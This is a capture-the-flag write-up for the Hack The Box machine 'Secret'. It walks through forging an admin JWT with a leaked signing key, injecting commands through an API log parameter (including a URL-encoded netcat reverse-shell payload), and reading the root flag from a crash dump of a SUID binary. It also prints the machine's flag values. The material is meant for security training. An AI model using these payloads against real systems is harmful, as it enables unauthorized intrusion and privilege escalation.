# SECRET - 10.10.11.120

## NMAP scan:

```
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
3000/tcp open  http    syn-ack Node.js (Express middleware)
```

## Web Enumeration

Got the source code of this website from: https://github.com/z9fr/auth-api

Got possible username of the admin: 'theadmin'.
Found /api with various endpoints like:

```
/user/login
/user/register
/priv
/logs/
```

The backend creates a JWT token of the input credentials while registering.

Registered a new account by:

```
curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "supresh","email": "sup@resh.com","password": "supresh"}'
```

To login:

```
curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "oopsie","email": "sup@resh.com","password": "supresh"}'
```

From source code found that it only checks if the name is 'theadmin' for admin.
So to tamper the JWT token, I used jwt_tool(https://github.com/ticarpi/jwt_tool).

```
python /opt/Git/jwt_tool/jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU
```

It gave the tampered JWT token.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw
```

So to check if we are admin:

```
curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'

Output: {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

So we have succecfully got JWT of admin.

There was a /api/logs which takes a file arguement.

```
curl 'http://secret.htb/api/logs?file=/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'

Output: {"killed":false,"code":128,"signal":null,"cmd":"git log --oneline /etc/passwd"}
```

## User.txt

```
curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

We succesfully ran command on the server.

To get reverse shell:

```
curl 'http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+<IP>+<PORT>+%3E%2Ftmp%2Ff%0A%0A' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'
```

Got the reverse shell.

```
user.txt: 0ba6627a048d36e7defa8c51d276cf66
```

## Root.txt

Found a file with s bit on.

```
find / -type f -perm -u=s 2>/dev/null

...
/opt/count
...
```

Three files in /opt/

```
code.c
count
valgrind.log
```

The count application takes path of a file and asks if to save the data or not.

Looking at the source code the write functionality looks intresting but the problem is that we cannot write in privilleged mode and not the content of file so there is no possible way we can write something to high-privileged file or see the content of higher privileged file.

The catch over here is that what if we crash the code in between the execution of the code.
Most of the time if we crash the process in between the report is most of the time saved in /var/crash in linux distro.
Normally this won't be possible but with this perm set prctl(PR_SET_DUMPABLE, 1); it could be possible.

### Shell 1

```
./opt/count -p
/root/root.txt
y
```

### Shell 2

```
ps -aux | grep count
```

Kill the process with PID of ./opt/count -p

```
kill -BUS <PID>
```

Now since the process is crashed, logs will be saved inside /var/crash

```
dasith@secret:/opt$ cd /var/crash
dasith@secret:/opt$ ls -al
total 88
drwxrwxrwt  2 root   root    4096 Oct 31 13:24 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 28127 Oct 31 13:24 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
```

Now make a temporary directory, I made /tmp/supresh

Now to unpack the logs:

```
apport-unpack _opt_count.1000.crash /tmp/supresh
```

Now go to the /tmp/supresh

We got CoreDump. Now lets get data from the coredump by:

```
strings CodeDump

...
root/root.txt
9b2bc596dedc67f00957ac88a6697daa
```

Got the root.txt

```
9b2bc596dedc67f00957ac88a6697daa
```
